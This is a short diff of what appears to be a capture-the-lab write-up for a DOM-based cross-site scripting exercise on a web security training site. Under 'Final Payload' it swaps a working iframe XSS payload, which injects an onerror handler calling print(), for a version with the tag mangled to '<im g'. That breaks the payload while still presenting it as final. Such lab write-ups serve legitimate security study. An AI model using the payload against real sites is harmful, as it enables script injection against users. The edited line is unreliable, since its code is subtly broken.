@@ -39,7 +39,7 @@ Trigger the `print()` function in the victim's browser.
 
 ✅ Final Payload
 
-<iframe src="https://LAB-ID.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+<iframe src="https://LAB-ID.web-security-academy.net//#" onload="this.src+='<im g src=x onerror=print()>'"></iframe>
 
 🔎 Which results in:
 
